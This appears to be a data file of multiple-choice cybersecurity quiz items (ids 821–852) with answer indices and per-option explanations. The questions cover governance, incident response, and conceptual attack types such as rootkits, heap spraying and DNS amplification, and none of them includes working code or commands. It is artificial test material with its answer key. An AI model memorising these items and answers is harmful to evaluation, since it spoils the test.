  {id:821,domain:G,question:"What is the purpose of a data classification policy?",options:["A policy that organizes data alphabetically for easier searching","A framework categorizing organizational data based on its sensitivity level (e.g., Public, Internal, Confidential, Restricted), determining the appropriate handling, storage, and protection requirements for each category","A policy that determines which file formats are allowed","A policy restricting data to a single physical location"],answer:1,explanation:"Data classification (often required by frameworks like FedRAMP, HIPAA) ensures that highly sensitive data (PII, financial records) receives stronger protections — encryption, restricted access, audit logging — while public data requires minimal controls, allowing organizations to allocate security resources proportionally to actual risk rather than applying uniform (and often inefficient) protection to all data.",optionExplanations:["Classification is based on sensitivity/risk level, not alphabetical or naming organization.","Data classification enables risk-appropriate, proportional security controls — without it, organizations either over-protect low-value data (wasting resources) or under-protect sensitive data (creating risk).","File format restrictions are a separate technical control, distinct from sensitivity-based classification.","Classification concerns handling requirements based on sensitivity, not physical data location/residency, though classification may inform location requirements."]},
  {id:822,domain:O,question:"What is the purpose of a security operations center (SOC) shift handoff process?",options:["A process for changing SOC physical furniture","A formal procedure ensuring continuity of awareness and ongoing investigations between outgoing and incoming SOC analyst shifts, preventing dropped incidents or lost context during shift changes","A process for rotating which analysts get which parking spots","A one-time process performed only during SOC opening"],answer:1,explanation:"Effective handoffs include a summary of ongoing investigations, unresolved alerts, any planned maintenance windows, and known issues — without proper handoff, an incident detected late in one shift might lose momentum or context when picked up (or missed) by the next shift, delaying response.",optionExplanations:["This isn't about physical workspace logistics; it's about operational continuity of security monitoring/investigation.","Continuous 24/7 SOC operations depend on smooth handoffs to maintain situational awareness and prevent incidents from falling through the cracks between shift changes.","Parking arrangements are unrelated to security operational continuity.","Handoffs occur at every shift change as an ongoing operational practice, not a one-time event."]},
  {id:823,domain:T,question:"What is a rootkit?",options:["A toolkit used by network administrators for routine maintenance","Malicious software designed to gain and maintain privileged (root/administrator) access to a system while actively hiding its presence from the operating system, security tools, and users","A starter kit for growing computer hardware components","A legitimate software installation package"],answer:1,explanation:"Kernel-level rootkits modify core OS components to intercept and falsify system calls, hiding malicious files, processes, and network connections from normal detection tools — because they operate at such a privileged level, rootkits are notoriously difficult to detect and often require specialized tools or a full OS reinstall to fully remove.",optionExplanations:["This describes legitimate admin tools, the opposite of malicious rootkit software.","Rootkits are distinguished by their stealth and persistence mechanisms — operating at a privileged level that lets them actively conceal their own presence from standard detection methods, unlike typical malware that just executes malicious payloads.","This is wordplay; rootkits have nothing to do with physical hardware kits.","Rootkits are malicious by definition, designed to maintain covert unauthorized access, unlike legitimate software installations."]},
  {id:824,domain:A,question:"What is the function of an HSM (Hardware Security Module) in an organization's cryptographic infrastructure?",options:["A module that physically secures server room doors","A dedicated, tamper-resistant physical device that securely generates, stores, and manages cryptographic keys and performs cryptographic operations, keeping private keys from ever being exposed to the host system's memory","A backup storage device for non-sensitive files","A module that monitors employee badge access"],answer:1,explanation:"HSMs are used for high-value key management scenarios like Certificate Authority root key protection, payment processing (PCI HSMs), and code signing — they're designed with tamper-evident/tamper-responsive mechanisms (some self-destruct keys if physical tampering is detected) and perform cryptographic operations internally so the private key material never leaves the hardware boundary.",optionExplanations:["This is a cryptographic device, not a physical building access control mechanism.","HSMs provide the highest level of key protection by ensuring private keys never exist in extractable form outside the tamper-resistant hardware, critical for high-value cryptographic operations like root CA key protection.","HSMs specifically protect sensitive cryptographic key material, not general-purpose file backup.","Badge access monitoring is physical security, unrelated to HSM's cryptographic key management function."]},
  {id:825,domain:O,question:"What is the purpose of the 'containment' phase in the incident response lifecycle?",options:["Permanently deleting all evidence related to the incident","Taking actions to limit the scope and spread of an ongoing security incident, preventing further damage while preserving evidence for later analysis, often before full eradication occurs","Containing the incident response team in a single room","Writing the final incident report"],answer:1,explanation:"Containment strategies range from short-term (isolating an infected host from the network while preserving its memory state for forensics) to long-term (rebuilding affected systems from clean images) — the goal is to stop the bleeding without destroying evidence needed to fully understand and remediate the root cause.",optionExplanations:["Containment specifically requires preserving evidence, not destroying it — evidence destruction would actually hinder eradication and lessons-learned efforts.","Containment is a critical NIST IR lifecycle phase that balances stopping ongoing damage with preserving forensic evidence, distinct from eradication (removing the threat) and recovery (restoring normal operations).","This isn't about physical team logistics; it's about limiting the technical scope of an incident.","Report writing occurs in the post-incident activity phase, distinct from the active containment phase during incident response."]},
  {id:826,domain:T,question:"What is a botnet?",options:["A legitimate network of customer service chatbots","A network of compromised, internet-connected devices (bots) infected with malware and controlled remotely by an attacker (botmaster), often used for DDoS attacks, spam distribution, or cryptocurrency mining","A network exclusively for robot manufacturing","A backup network maintained by ISPs"],answer:1,explanation:"The Mirai botnet famously compromised hundreds of thousands of IoT devices (cameras, routers) with weak default credentials, using their combined bandwidth to launch some of the largest DDoS attacks recorded — botnets derive their power from scale, allowing attackers to harness massive distributed computing/bandwidth resources without owning any of the infrastructure themselves.",optionExplanations:["This describes legitimate customer service automation, unrelated to malicious compromised device networks.","Botnets provide attackers with massive distributed capability (for DDoS, spam, cryptomining, or further malware distribution) by aggregating control over thousands or millions of compromised devices, often without owners' knowledge.","This is wordplay; botnets refer to compromised computing devices, not robot manufacturing infrastructure.","Botnets are malicious infrastructure controlled by attackers, not legitimate ISP backup systems."]},
  {id:827,domain:P,question:"What is the purpose of a records of processing activities (RoPA) document under GDPR?",options:["A document recording employee attendance","A documented inventory of an organization's personal data processing activities, including what data is collected, why, how it's used, who has access, and retention periods, required for GDPR Article 30 compliance","A list of all IT equipment purchases","A record of physical office visitor logs"],answer:1,explanation:"RoPA documentation provides accountability and transparency, helping organizations (and regulators during audits) understand the full scope of personal data processing across the enterprise — it's foundational for demonstrating GDPR compliance and is often a prerequisite for conducting effective privacy impact assessments.",optionExplanations:["This isn't about employee attendance tracking; it documents personal data processing activities specifically.","RoPA is a core GDPR accountability requirement, providing the documented foundation organizations need to demonstrate compliance and respond to data subject requests or regulatory inquiries.","Equipment procurement records are unrelated to personal data processing documentation requirements.","Visitor logs are a physical security record, distinct from the data processing activity documentation required under GDPR Article 30."]},
  {id:828,domain:T,question:"What is a zero-day exploit?",options:["An exploit that takes zero days to develop","An exploit that targets a previously unknown vulnerability for which no patch or fix yet exists, giving defenders zero days of advance warning to prepare or remediate","An exploit only usable on the day it's released","A vulnerability that has existed for zero days since the system was deployed"],answer:1,explanation:"Zero-day vulnerabilities are especially dangerous because traditional signature-based defenses and patches don't yet exist — they're often discovered and weaponized by sophisticated threat actors (nation-states, well-resourced criminal groups) and sold on underground markets for substantial sums before vendors become aware and can issue patches.",optionExplanations:["Zero-day exploits can take significant time and skill to develop; 'zero-day' refers to the defenders having zero days of advance warning, not the development timeline.","The term refers to the vulnerability being unknown to the vendor/defenders ('zero days' to prepare a fix), making zero-days particularly valuable to attackers since no patch or signature-based detection yet exists.","Zero-day exploits often remain usable for an extended period after initial use, until the vulnerability is discovered and patched.","'Zero-day' describes the lack of advance defender knowledge/patch availability, not the system's deployment age."]},
  {id:829,domain:A,question:"What is the purpose of secure boot in modern computing devices?",options:["Booting the system faster than normal","A security feature that verifies each component loaded during the boot process (firmware, bootloader, OS kernel) is cryptographically signed and trusted, preventing execution of unauthorized or malicious code before the OS fully loads","Booting the system into a secure, isolated guest mode","Encrypting the boot password only"],answer:1,explanation:"Secure boot establishes a chain of trust starting from the hardware root of trust (often anchored in the TPM or UEFI firmware) through each subsequent boot stage — if malware (like a bootkit) attempts to tamper with any component in this chain, the signature verification fails and the system refuses to boot that compromised component, preventing pre-OS-level persistence.",optionExplanations:["Secure boot is about integrity verification, not boot speed optimization (it actually adds minor verification overhead).","Secure boot specifically defends against low-level persistence threats like bootkits and rootkits that try to compromise the system before the OS and its security tools even load, by enforcing cryptographic verification at each boot stage.","This isn't about creating an isolated guest session; it's about verifying boot component integrity for the primary OS.","Secure boot validates code signatures throughout the boot chain, not specifically password encryption."]},
  {id:830,domain:O,question:"What is the purpose of a vulnerability management program's risk-based prioritization?",options:["Patching vulnerabilities in alphabetical order by CVE ID","Prioritizing remediation efforts based on factors like CVSS severity score, exploit availability, asset criticality, and exposure, rather than treating all vulnerabilities as equally urgent","Patching only vulnerabilities reported by external researchers","Ignoring vulnerabilities with low CVSS scores entirely"],answer:1,explanation:"A critical CVSS 9.8 vulnerability on an internal, isolated test server with no internet exposure may actually be lower priority than a CVSS 7.5 vulnerability on an internet-facing production server with a known public exploit — risk-based prioritization (using frameworks like EPSS alongside CVSS) ensures limited patching resources address the vulnerabilities posing the greatest actual organizational risk first.",optionExplanations:["CVE ID ordering has no relationship to actual risk or urgency; it's simply a sequential identifier.","Risk-based prioritization recognizes that not all vulnerabilities pose equal real-world risk — context like exploitability, asset value, and exposure must factor in alongside raw severity scores to allocate limited remediation resources effectively.","Vulnerability sourcing (internal scan vs external researcher) doesn't determine remediation priority; actual risk factors do.","Low CVSS vulnerabilities can still pose meaningful risk in certain contexts (e.g., when chained with other vulnerabilities) and shouldn't be entirely ignored, just appropriately deprioritized."]},
  {id:831,domain:T,question:"What is a malicious USB drop attack?",options:["An attack that drops USB prices in a store","A social engineering technique where attackers leave infected USB drives in locations where targets are likely to find and plug them in out of curiosity, triggering malware execution","An attack that physically damages USB ports","A technique for safely disposing of old USB drives"],answer:1,explanation:"Attackers might leave USB drives labeled 'Salary Information' or 'Confidential' in a company parking lot — curiosity drives employees to plug them into work computers, where autorun malware or a malicious HID (Human Interface Device) emulation script executes automatically, demonstrating how physical and psychological attack vectors combine.",optionExplanations:["This is wordplay; the attack involves dropping (leaving) physical devices, not pricing.","USB drop attacks exploit human curiosity as the attack vector, bypassing network-based defenses entirely since the malware is delivered via physical media rather than over the network.","This is a social engineering/malware delivery technique, not physical port damage.","This describes a malicious attack technique, not a legitimate, secure disposal practice."]},
  {id:832,domain:A,question:"What is the purpose of a Web Application Firewall (WAF) in protecting web applications?",options:["A physical firewall device placed near web servers in the data center","A security control that filters, monitors, and blocks malicious HTTP/HTTPS traffic to and from a web application, protecting against attacks like SQL injection, XSS, and other OWASP Top 10 vulnerabilities","A firewall that only blocks traffic from specific countries","A backup system for web application code"],answer:1,explanation:"WAFs (Cloudflare, AWS WAF, ModSecurity) operate at Layer 7, inspecting actual HTTP request content against rule sets (signature-based or anomaly-based) to block malicious payloads before they reach the application — providing a critical compensating control for vulnerabilities that haven't yet been patched in the application code itself.",optionExplanations:["WAFs operate at the application layer inspecting HTTP traffic content, distinct from a traditional network-layer physical firewall appliance.","WAFs specifically target web application-layer attacks by inspecting HTTP request/response content, providing protection against the OWASP Top 10 vulnerability classes that traditional network firewalls can't detect.","Geo-blocking can be one feature of some WAFs, but the core function is content-based malicious traffic filtering, not solely geographic restriction.","WAFs filter live traffic; they don't provide code backup/version control functionality."]},
  {id:833,domain:O,question:"What is the purpose of an incident response retainer agreement with a third-party firm?",options:["A retainer that guarantees a firm will never report incidents to authorities","A pre-arranged contract with an external incident response/forensics firm ensuring rapid access to specialized expertise and resources during a major incident, without negotiating terms during the high-pressure crisis itself","A retainer fee paid to law enforcement for protection","An agreement that replaces the need for an internal IR team entirely"],answer:1,explanation:"Organizations without 24/7 in-house deep forensic capability often establish retainers with firms like Mandiant or CrowdStrike Services beforehand — this guarantees rapid response time (often contracted SLAs of hours, not days) and avoids the costly delay of vetting and negotiating contracts while actively under attack.",optionExplanations:["Legal/regulatory reporting obligations exist independently of any retainer agreement and firms wouldn't legally agree to violate them.","Pre-negotiated retainers eliminate the time-consuming vendor selection and contract negotiation process during an active crisis, when speed of response significantly impacts incident containment and damage.","This isn't a payment to law enforcement; it's a contract with a private incident response/forensics service provider.","Retainers typically augment internal capabilities for surge capacity or specialized expertise, rather than replacing an organization's own internal incident response function entirely."]},
  {id:834,domain:T,question:"What is a malvertising attack?",options:["An attack on advertising agency physical offices","Malicious advertising — using legitimate online advertising networks to distribute malware or redirect users to malicious sites, often without requiring any user interaction beyond viewing the ad","A type of spam email about products","A technique for creating fake online reviews"],answer:1,explanation:"Attackers purchase ad space through legitimate ad networks (which often have automated, less-vetted approval processes) and embed malicious code or redirects in the ad creative — drive-by-download malvertising can compromise visitors of even well-known, reputable websites without any click, just by loading a page containing the malicious ad.",optionExplanations:["This is a digital attack vector through online ad networks, not a physical office attack.","Malvertising is particularly insidious because it can compromise users on completely legitimate, trusted websites through the ad supply chain, sometimes requiring no user interaction at all (drive-by downloads).","This isn't email spam; it's malicious content distributed through legitimate online advertising networks/exchanges.","Fake reviews are a different deceptive marketing practice, unrelated to malware distribution via ad networks."]},
  {id:835,domain:G,question:"What is the concept of 'security through obscurity' and why is it generally considered insufficient as a primary defense?",options:["Relying solely on hiding system details or implementation rather than strong, well-vetted security controls — generally insufficient because once the obscured details are discovered, the system is left with no real protection", "A formal cryptographic algorithm design principle","A government classification system","A method requiring all security configurations be kept hidden from auditors"],answer:0,explanation:"Examples include running services on non-standard ports hoping attackers won't find them, or using a custom, unvetted encryption algorithm instead of a proven one — while obscurity can be one layer in defense-in-depth, relying on it alone fails catastrophically once the secret is discovered (e.g., through scanning, reverse engineering, or insider leak), since there's no underlying robust control.",optionExplanations:["This accurately describes the concept and its key weakness — Kerckhoffs's principle states a system should be secure even if everything about it except the key is public knowledge, which security through obscurity violates.","This describes the opposite; legitimate cryptographic design follows open, peer-reviewed standards (Kerckhoffs's principle) rather than relying on secrecy of the algorithm itself.","This isn't a formal government classification framework; it's a general security design anti-pattern/criticism.","Hiding configurations from legitimate auditors would actually undermine security governance and accountability, not represent the concept being described."]},
  {id:836,domain:O,question:"What is the purpose of network flow data (NetFlow/sFlow) analysis in security monitoring?",options:["Analyzing only the physical flow of water cooling systems","Collecting and analyzing metadata about network traffic flows (source/destination IPs, ports, protocols, byte counts) without capturing full packet content, useful for detecting anomalous traffic patterns and supporting incident investigation","A tool for managing employee workflow approvals","A technique for measuring internet service provider billing"],answer:1,explanation:"NetFlow data is much smaller than full packet captures, making it practical to retain for long periods — security teams can use it to identify unusual data exfiltration volumes, detect communication with known malicious IPs, or trace lateral movement patterns during an investigation, even without the full packet content that would be needed for deep content inspection.",optionExplanations:["This is network traffic metadata analysis, unrelated to physical cooling infrastructure.","NetFlow/sFlow provides a scalable way to monitor traffic patterns and detect anomalies (volume spikes, unusual destinations) across an entire network without the storage overhead of full packet capture, making it valuable for both real-time monitoring and historical investigation.","This isn't about business process workflow; it's network traffic metadata used for security visibility.","While ISPs may use flow data for billing in some contexts, the security application is about traffic pattern analysis and anomaly detection, not billing."]},
  {id:837,domain:T,question:"What is a man-in-the-middle (MITM) attack at a fundamental level?",options:["An attack requiring the attacker to be a literal middle manager","An attack where an adversary secretly intercepts and potentially alters communications between two parties who believe they are communicating directly with each other","A negotiation tactic in business deals","An attack targeting only middleware software components"],answer:1,explanation:"MITM can occur at many layers — ARP poisoning (Layer 2), rogue WiFi APs, BGP hijacking, or compromised/malicious TLS certificates — the unifying theme is that the attacker positions themselves transparently in the communication path, often able to eavesdrop, modify data in transit, or impersonate one or both parties without either realizing the interception is occurring.",optionExplanations:["This is wordplay; MITM has nothing to do with organizational hierarchy/management positions.","MITM is a broad attack category unified by the attacker's positioning in the communication path, applicable across many different protocols and layers — the core threat is the betrayal of an assumed direct, private communication channel.","This isn't a business negotiation strategy; it's a technical security attack pattern.","While middleware can be a target in some scenarios, MITM as a concept applies broadly to any intercepted communication channel, not specifically middleware software."]},
  {id:838,domain:A,question:"What is the purpose of implementing rate limiting on an API or login endpoint?",options:["Rate limiting determines how much customers are billed","Restricting the number of requests a client can make within a specified time period, protecting against brute force attacks, credential stuffing, denial of service, and API abuse","Limiting only the speed of file downloads","A feature that has no security purpose, only performance benefits"],answer:1,explanation:"A login endpoint with rate limiting (e.g., max 5 attempts per minute per IP) significantly slows down brute force and credential stuffing attacks, making them impractical at scale, while API rate limiting prevents a single client from monopolizing resources or scraping data en masse — proper rate limiting also helps protect against application-layer DoS attacks.",optionExplanations:["Billing rate is a separate business/commercial concept, distinct from request throttling for security purposes.","Rate limiting is a critical control against several attack categories — by capping request frequency, it makes automated, high-volume attacks (brute force, credential stuffing, scraping) impractical or significantly slower.","Rate limiting applies broadly to any request type, not exclusively file downloads.","While performance benefits exist, rate limiting has clear security value specifically as an anti-automation and anti-abuse control."]},
  {id:839,domain:O,question:"What is the purpose of a security control self-assessment versus an independent audit?",options:["Self-assessments are always more reliable than independent audits","A self-assessment is conducted internally by the organization to evaluate its own control effectiveness, often as ongoing governance, while an independent audit is conducted by an external, objective party to validate compliance and control effectiveness with greater assurance", "Self-assessments are required by law while audits are optional","There is no meaningful difference between the two"],answer:1,explanation:"Self-assessments are valuable for continuous internal monitoring and catching issues early at lower cost, but they can suffer from bias or blind spots since the assessor may be evaluating their own work — independent audits (SOC 2, ISO 27001 certification audits) provide external validation with greater credibility for customers, regulators, and business partners specifically because of their objectivity.",optionExplanations:["Independent audits generally provide higher assurance due to their objectivity, though self-assessments serve a valuable, more frequent internal monitoring purpose.","This distinction reflects the tradeoff between frequency/cost (self-assessment) and assurance/credibility (independent audit) — mature security programs typically use both as complementary approaches.","Requirements vary by industry and regulation; neither is universally mandated, though certain compliance frameworks may require independent audits specifically.","These serve distinct, complementary purposes with different levels of assurance, objectivity, and typical use cases within a governance program."]},
  {id:840,domain:T,question:"What is a heap spray attack technique?",options:["A technique for cleaning up unused memory","An exploitation technique that fills a large portion of a program's heap memory with attacker-controlled shellcode/NOP sleds, increasing the probability that a memory corruption vulnerability will redirect execution into the attacker's injected code","A technique for compressing data in memory","A network attack that floods routers with spray-pattern packets"],answer:1,explanation:"Because exact memory addresses are often unpredictable (especially with ASLR), heap spraying increases the attacker's odds of success by saturating large swaths of memory with shellcode preceded by long NOP sled sequences — if the corrupted pointer lands anywhere within the sprayed region, execution likely slides into the malicious payload, commonly used in browser/JavaScript engine exploits.",optionExplanations:["This is an offensive exploitation technique, not a memory management/garbage collection process.","Heap spraying is a probabilistic exploitation technique that compensates for memory layout unpredictability by saturating memory with attacker-controlled content, commonly paired with browser-based memory corruption vulnerabilities.","This isn't about data compression; it's about filling memory with malicious payload for exploitation purposes.","This is a memory exploitation technique, unrelated to network packet flooding attacks against routers."]},
  {id:841,domain:A,question:"What is the purpose of a sandbox environment in malware analysis?",options:["A children's recreational area at a tech company","An isolated, controlled environment where suspicious files or code can be safely executed and observed to analyze their behavior without risking damage to production systems","A sandbox used only for testing UI designs","A backup environment used during disaster recovery"],answer:1,explanation:"Dynamic malware analysis sandboxes (Cuckoo Sandbox, Joe Sandbox, ANY.RUN) execute suspicious files in a monitored virtual environment, recording file system changes, network connections, and process behavior — this allows analysts to understand malware capabilities and IOCs (indicators of compromise) without risking infection of real systems, though sophisticated malware may include sandbox-evasion techniques to detect and avoid analysis.",optionExplanations:["This is a technical security analysis tool, not a literal recreational sandbox.","Sandboxing provides safe behavioral analysis of unknown/suspicious code, critical for understanding new malware threats and extracting actionable threat intelligence without risking production system compromise.","UI/UX testing environments are a different concept from security analysis sandboxes.","DR environments serve business continuity, a different purpose from isolated malware behavioral analysis."]},
  {id:842,domain:T,question:"What is a DNS amplification attack?",options:["An attack that improves DNS resolution speed for legitimate users","A DDoS technique exploiting DNS servers configured to respond to small spoofed queries with much larger responses, directing the amplified traffic at a victim whose IP was spoofed as the query source","An attack that physically amplifies network signal strength","A method for legitimately scaling DNS infrastructure"],answer:1,explanation:"Attackers send small DNS queries (e.g., 60 bytes) with a spoofed source IP set to the victim's address, to open DNS resolvers that return large responses (e.g., 3000+ bytes) — this amplification factor (potentially 50x or more) combined with reflection (the response goes to the spoofed victim, not the attacker) makes DNS amplification a powerful and popular DDoS technique.",optionExplanations:["This attack degrades, not improves, performance for the victim being flooded with amplified traffic.","DNS amplification combines two techniques — reflection (spoofed source IP) and amplification (small request, large response) — to achieve devastating DDoS impact while obscuring the true attacker's identity and location.","This is a network-layer traffic volume attack technique, not related to physical RF signal amplification.","This describes malicious DDoS traffic generation, not legitimate DNS infrastructure scaling/capacity planning."]},
  {id:843,domain:O,question:"What is the purpose of conducting red team versus blue team versus purple team exercises?",options:["Red, blue, and purple refer to different colored uniforms with no functional difference","Red team simulates real-world attackers to test defenses, blue team defends and detects, and purple team facilitates collaboration and knowledge sharing between red and blue to maximize the learning and improvement from the exercise","These terms refer to different shifts of the same SOC team performing identical tasks","Only the blue team's findings are considered valid in security assessments"],answer:1,explanation:"Pure red team exercises test detection/response capability adversarially (sometimes without blue team's prior knowledge), while purple teaming intentionally breaks down the wall between offense and defense — red and blue work together in real time, with red team explaining techniques as they execute them so blue team can immediately validate and tune their detection capability, accelerating the overall security improvement cycle.",optionExplanations:["Each team has fundamentally different objectives, skill sets, and methodologies, not just cosmetic differences.","This collaborative model (purple teaming) has become increasingly popular because it accelerates defensive improvement by providing immediate feedback, rather than only finding gaps after an adversarial exercise concludes.","These represent functionally distinct roles and methodologies (offense vs defense vs collaborative), not simply shift rotations of identical work.","Both red team findings (gaps in defense) and blue team findings (what was detected/missed) provide valuable, complementary insights into overall security posture."]},
  {id:844,domain:T,question:"What is an attack surface, and why is reducing it important?",options:["The physical surface area of a server rack","The sum of all points (entry points, vulnerabilities, exposed services, code paths) where an unauthorized user could potentially attempt to enter or extract data from a system, with a smaller attack surface generally meaning fewer opportunities for exploitation","A surface used only for malware delivery via USB","A term referring only to network perimeter firewalls"],answer:1,explanation:"Attack surface reduction techniques include disabling unused services, removing unnecessary software, closing unused ports, and minimizing exposed APIs — every additional feature, open port, or running service represents another potential vector an attacker could exploit, so the security principle is to minimize what's exposed to only what's functionally necessary.",optionExplanations:["This is a conceptual/logical security measure, not a literal physical hardware dimension.","Attack surface encompasses all potential entry/exit points across software, network, and even physical/human vectors — reducing it (via least functionality, hardening) directly reduces the number of ways an attacker could potentially compromise a system.","Attack surface is a broad concept covering all exposure points, not limited to any single delivery mechanism like USB.","Attack surface extends well beyond network perimeter firewalls to include application code, APIs, exposed services, and even human/social engineering vectors."]},
  {id:845,domain:G,question:"What is the purpose of a risk register?",options:["A register listing all employees with security clearances","A documented, centralized inventory of identified organizational risks, including their likelihood, potential impact, current mitigation status, and assigned risk owner, used to track and manage risk over time","A list of approved software vendors","A log of all network login attempts"],answer:1,explanation:"Risk registers provide visibility for risk management decision-making — leadership can review the register to see, for example, that an unpatched legacy system represents a 'High' likelihood/'High' impact risk currently being mitigated through network segmentation while a permanent fix is planned, supporting informed risk acceptance, transfer, mitigation, or avoidance decisions.",optionExplanations:["This is a risk management tracking document, not a personnel security clearance list.","The risk register is a foundational risk management artifact, providing ongoing visibility into the organization's risk landscape and enabling prioritized, informed decision-making about where to allocate mitigation resources.","Vendor approval lists are a separate procurement/vendor management artifact, distinct from organizational risk tracking.","Login attempt logs are operational security monitoring data, a different category from strategic risk management documentation."]},
  {id:846,domain:O,question:"What is the purpose of establishing escalation procedures within an incident response plan?",options:["Procedures for escalating employee salaries","Predefined criteria and processes for promptly notifying appropriate personnel (management, legal, executives) based on incident severity, ensuring the right people are involved at the right time during a security incident","A procedure for promoting analysts to senior positions","A process used exclusively for IT help desk tickets"],answer:1,explanation:"Escalation procedures specify, for example, that any incident involving suspected data breach of customer PII must immediately notify legal counsel and the CISO within 1 hour, while a routine malware detection on an isolated workstation follows standard analyst-level handling — clear escalation criteria prevent both under-escalation (executives unaware of a major breach) and over-escalation (executives drowning in minor alert noise).",optionExplanations:["This is unrelated to compensation; escalation procedures govern incident notification chains.","Well-defined escalation criteria ensure appropriate stakeholders (legal, executive, regulatory) are engaged at the right severity threshold, balancing timely awareness against alert fatigue from over-escalating minor incidents.","Career advancement is an HR process, distinct from incident severity-based notification procedures.","While help desk tickets may have similar concepts, formal incident response escalation procedures specifically address security incident severity and stakeholder notification, a broader scope than general IT support."]},
  {id:847,domain:T,question:"What is a pretexting social engineering attack?",options:["An attack that occurs before any actual text message is sent","A social engineering technique where an attacker creates a fabricated scenario or false identity (pretext) to manipulate a victim into divulging information or performing an action they otherwise wouldn't", "A method for testing software before release","An attack targeting SMS text messaging systems specifically"],answer:1,explanation:"Example: an attacker calls the help desk claiming to be a traveling executive who's locked out and urgently needs a password reset, fabricating enough plausible detail (correct employee ID, knowledge of org structure) to convince the help desk technician to bypass normal verification procedures — pretexting relies on a convincing, prepared backstory rather than urgency or fear alone.",optionExplanations:["This is wordplay; pretexting refers to a fabricated 'pretext' scenario/story, unrelated to SMS text messaging timing.","Pretexting's effectiveness comes from the attacker's prepared, plausible false narrative that establishes false trust or authority, distinguishing it from simpler social engineering relying purely on urgency or generic deception.","This isn't software QA testing; it's a social engineering manipulation technique targeting humans.","Pretexting can occur over phone, email, in-person, or any communication channel — it's not specific to SMS technology."]},
  {id:848,domain:A,question:"What is the purpose of implementing TLS mutual authentication (mTLS)?",options:["A protocol requiring both parties to mutually agree on a price","A configuration where both the client and server authenticate each other using digital certificates during the TLS handshake, rather than only the server presenting a certificate as in standard TLS, providing stronger bidirectional trust","A backup TLS configuration used only during outages","A protocol that doubles encryption strength automatically"],answer:1,explanation:"mTLS is commonly used for service-to-service authentication in zero trust architectures and API security (microservices communicating within a service mesh) — since both parties present and validate certificates, it provides strong mutual identity assurance, ensuring a malicious or unauthorized client can't connect even if it knows the correct endpoint URL.",optionExplanations:["This isn't about pricing negotiation; it's about cryptographic bidirectional identity verification.","mTLS extends standard one-way TLS server authentication to also authenticate the client, providing stronger assurance critical for zero-trust environments where verifying both endpoints' identities is essential.","mTLS is a standard, ongoing configuration for appropriate use cases, not solely a failover/outage mechanism.","mTLS doesn't double encryption strength; it adds an additional authentication direction (client authentication) to the existing TLS handshake."]},
  {id:849,domain:O,question:"What is the purpose of conducting a root cause analysis (RCA) after a security incident?",options:["Identifying which employee to discipline for the incident","A systematic process for identifying the fundamental, underlying cause of an incident (not just its immediate symptoms), enabling organizations to implement corrective actions that prevent recurrence", "A financial analysis of incident response costs","A process performed only for incidents involving physical security"],answer:1,explanation:"RCA techniques like the '5 Whys' help teams move past surface-level findings (e.g., 'malware got in through a phishing email') to deeper systemic issues (e.g., 'why did the email bypass filtering? Why wasn't MFA enforced? Why was the employee's training overdue?') — addressing only symptoms without RCA often leads to repeat incidents from the same underlying gaps.",optionExplanations:["RCA in security contexts focuses on systemic/technical causes and process gaps, not assigning individual blame, which discourages honest incident reporting.","RCA distinguishes itself from simple incident documentation by digging into systemic causes, ensuring remediation addresses the actual root issue rather than just the visible symptom, preventing recurrence of similar incidents.","While cost may be tracked separately, RCA's primary focus is causal/technical analysis, not financial accounting.","RCA applies to security incidents broadly across all domains (technical, physical, procedural), not exclusively physical security incidents."]},
  {id:850,domain:T,question:"What is a watering hole versus drive-by download attack — what's the key relationship?",options:["They are completely unrelated and never occur together","A watering hole attack often uses a drive-by download as its delivery mechanism — once a target visits the compromised legitimate site, malicious code automatically attempts to exploit browser vulnerabilities and install malware without further user interaction","Drive-by downloads only occur through email attachments","Watering hole attacks always require the victim to manually download and run a file"],answer:1,explanation:"In a typical watering hole attack chain, attackers first compromise a legitimate, trusted website frequented by their target group, then embed exploit code that performs a drive-by download — automatically attempting to exploit unpatched browser or plugin vulnerabilities to silently install malware the moment a vulnerable visitor loads the page, with no click or download action required from the victim.",optionExplanations:["These techniques are frequently combined, with drive-by download serving as the actual malware delivery mechanism within a watering hole campaign.","This combination is a classic and dangerous pairing — the watering hole provides the trusted delivery vector (a site victims already visit) while drive-by download provides the automatic, no-interaction-required exploitation and infection mechanism.","Drive-by downloads occur through compromised or malicious web pages, not specifically email attachments (which would be a different delivery vector).","The defining characteristic of a drive-by download is that it requires no explicit manual download/run action — infection occurs automatically just from visiting the page."]},
  {id:851,domain:G,question:"What is the purpose of conducting threat modeling during the software design phase?",options:["Modeling software performance under heavy load only","A structured process for identifying potential threats, vulnerabilities, and attack vectors to a system during design, allowing security controls to be built in proactively rather than added as an afterthought after deployment", "Creating 3D visual models of network topology","A modeling technique used only for marketing materials"],answer:1,explanation:"Frameworks like STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) help development teams systematically consider 'what could go wrong' for each component during design — identifying and addressing security issues at the design phase is dramatically cheaper than discovering and fixing them after deployment or, worse, after an actual breach.",optionExplanations:["Threat modeling addresses security risks broadly, not specifically performance/load testing.","Threat modeling embodies 'shift-left' security principles, embedding security consideration into the design process when changes are cheapest and architectural decisions can still accommodate necessary controls.","This isn't about visual network diagramming; it's an analytical security risk identification process during design.","Threat modeling is a technical security engineering practice, unrelated to marketing content creation."]},
  {id:852,domain:O,question:"What is the purpose of a security exception/risk acceptance process?",options:["A process for permanently ignoring all security policies","A formal, documented process for evaluating, approving, and tracking instances where a system or process cannot fully comply with security policy, requiring risk owner sign-off and often compensating controls or a remediation timeline","A process used only to fire employees who violate policy","An automated process requiring no human review"],answer:1,explanation:"Example: a legacy application requiring an outdated, vulnerable protocol can't be immediately replaced due to business constraints — a documented exception with compensating controls (network isolation, enhanced monitoring) and an executive risk owner's sign-off ensures the risk is consciously accepted and tracked, rather than silently ignored or indefinitely deferred without accountability.",optionExplanations:["Exception processes formally document and track non-compliance with required justification and oversight, rather than allowing unchecked policy violations.","Formal exception processes maintain governance accountability — ensuring deviations from policy are deliberate, time-bound, and have an accountable risk owner, rather than becoming permanent unmanaged gaps.","This is a risk governance process, not a disciplinary/HR action against individuals.","Exception requests require human risk owner review and approval/sign-off, as automated approval would undermine the governance purpose of the process."]},
